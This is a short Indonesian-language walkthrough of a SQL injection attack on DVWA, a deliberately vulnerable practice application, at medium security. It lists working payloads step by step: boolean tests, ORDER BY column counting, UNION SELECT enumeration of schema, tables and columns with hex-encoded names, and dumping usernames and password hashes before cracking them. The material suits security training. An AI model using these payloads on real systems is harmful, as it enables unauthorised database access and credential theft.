# SQL Injection DVWA Level Medium

## Langkah - langkah serangan

### Tahap pertama
```sql
# Perintah ini untuk mengecek apakah suatu web memiliki kerentanan SQL Injection.
# Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
AND 1=1#
```

### Tahap Kedua
```sql
# Perintah ini untuk mengecek ada siapa saja user yang terdapat di web DVWA
# Merupakan ekspresi logika yang selalu benar.
# Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
OR 1=1#
```

### Tahap Ketiga
```sql
# Perintah ini digunakan untuk menampilkan ada berapa saja jumlah kolom yang ada
# Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
ORDER BY 3 #
```

### Tahap Keempat
```sql
# Perintah ini digunakan untuk menampilkan nama database yang digunakan serta versi dari database nya
# Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
UNION SELECT VERSION(), DATABASE()#
```

### Tahap Kelima
```sql
# Perintah ini digunakan untuk menampilkan semua nama tabel
# UNION SELECT digunakan untuk menggabungkan hasil dari dua atau lebih pernyataan SELECT 
UNION SELECT 1,table_name FROM information_schema.tables;
```

### Tahap Keenam
```sql
# Perintah ini digunakan untuk menampilkan semua nama tabel yang terdapat di dalam database dvwa(0x64767761)
# UNION SELECT digunakan untuk menggabungkan hasil dari dua atau lebih pernyataan SELECT 
UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema = 0x64767761;
```

### Tahap Ketujuh
```sql
# Perintah ini digunakan untuk menampilkan semua columns yang terdapat di dalam tabel users(0x7573657273)
# UNION SELECT digunakan untuk menggabungkan hasil dari dua atau lebih pernyataan SELECT 
UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 0x7573657273;
```

### Tahap Kedelapan
```sql
# Perintah ini digunakan untuk menampilkan semua user dan password yang terdapat di dalam tabel users
# UNION SELECT digunakan untuk menggabungkan hasil dari dua atau lebih pernyataan SELECT 
UNION SELECT user , password FROM users;
```

### Tahap Terakhir
```sql
# Lakukan cracking password
```